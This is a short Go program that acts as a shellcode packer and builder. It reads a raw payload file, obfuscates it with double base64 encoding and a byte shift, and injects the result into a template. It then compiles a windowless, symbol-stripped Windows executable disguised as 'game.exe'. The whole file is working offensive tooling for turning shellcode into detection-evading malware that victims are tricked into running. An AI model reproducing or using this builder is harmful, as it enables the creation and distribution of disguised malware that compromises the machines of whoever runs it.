package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

var kkk = []byte{0x23, 0x32}

func getEnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]+kkk[0]-kkk[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func main() {

	path := "C:\\Users\\Administrator\\Desktop\\payload.bin"
	if len(os.Args) >= 2 {
		path = os.Args[1]
	}
	sc, _ := ioutil.ReadFile(path)
	bdata := getEnCode(sc)
	fmt.Println(bdata)
	ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)

	tmpl, _ := ioutil.ReadFile("./genExe")

	code := string(tmpl)

	code = strings.ReplaceAll(code, "${bdata}", bdata)

	ioutil.WriteFile("shellcode.go", []byte(code), 0666)
	cmd := exec.Command("go", "build", "shellcode.go", "-ldflags=\"-s -w -H=windowsgui\"", "-o", "game.exe", "shellcode.go")
	//cmd:=exec.Command("go","build shellcode.go -ldflags=\"-s -w -H=windowsgui\" -o main2.exe shellcode.go")
	cmd.Run()
	//os.Remove("shellcode.go")

}
